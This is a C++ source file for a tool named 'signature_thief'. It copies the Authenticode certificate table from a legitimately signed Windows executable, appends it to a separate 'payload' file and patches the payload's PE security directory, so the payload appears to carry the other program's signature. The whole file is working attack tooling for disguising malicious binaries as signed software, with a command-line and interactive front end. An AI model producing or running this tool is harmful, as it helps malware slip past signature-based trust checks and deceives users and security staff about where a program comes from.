#include "signature_thief.hpp"

#include <iostream>
#include <fstream>
#include <stdexcept>

signature_thief::signature_thief(std::filesystem::path path_to_file) : m_source_path(std::move(path_to_file)) {}

std::optional<std::string> signature_thief::load_file() noexcept {
    std::ifstream file(m_source_path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return "Error opening file: " + m_source_path.string();
    }

    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    m_file.resize(size);
    file.read(reinterpret_cast<char*>(m_file.data()), size);

    return std::nullopt;
}

void signature_thief::extract_certificate(std::filesystem::path source_path) {
    std::ifstream file(source_path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        throw std::runtime_error("Error opening file: " + source_path.string());
    }

    auto size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);

    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    if (cert_info.VirtualAddress == 0 || cert_info.Size == 0 || cert_info.VirtualAddress + cert_info.Size > buffer.size()) {
        throw std::runtime_error("No valid certificate found in file: " + source_path.string());
    }

    m_cert.assign(buffer.begin() + cert_info.VirtualAddress, buffer.begin() + cert_info.VirtualAddress + cert_info.Size);
}

void signature_thief::append_certificate_to_payload(std::span<const uint8_t> signature_data) {
    if (signature_data.empty()) {
        throw std::runtime_error("No certificate extracted to append.");
    }
    update_pe_header();
    m_file.insert(m_file.end(), signature_data.begin(), signature_data.end());
}

void signature_thief::update_pe_header() {
    auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(m_file.data());
    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(m_file.data() + dos_header->e_lfanew);
    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    cert_info.VirtualAddress = static_cast<DWORD>(m_file.size());
    cert_info.Size = static_cast<DWORD>(m_cert.size());
}

int main(int argc, char** argv) {
    try {
        std::string signed_pe_path, payload_path, output_path;

        if (argc >= 4) {
            signed_pe_path = argv[1];
            payload_path = argv[2];
            output_path = argv[3];
        }
        else {
            std::cout << "Enter the path to the signed file: ";
            std::getline(std::cin, signed_pe_path);

            std::cout << "Enter the path to the payload file: ";
            std::getline(std::cin, payload_path);

            std::cout << "Enter the output path: ";
            std::getline(std::cin, output_path);
        }

        signature_thief thief(payload_path);
        auto result = thief.load_file();
        if (result) {
            std::cerr << "Error: " << *result << "\n";
            return EXIT_FAILURE;
        }

        thief.extract_certificate(signed_pe_path);
        thief.append_certificate_to_payload(thief.get_certificate());

        std::ofstream output_file(output_path, std::ios::binary);
        if (!output_file.is_open()) {
            throw std::runtime_error("Error opening output file: " + output_path);
        }
        output_file.write(reinterpret_cast<const char*>(thief.get_binary().data()), thief.get_binary().size());
        output_file.close();

        std::cout << "Signature appended successfully." << std::endl;
        return EXIT_SUCCESS;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
}
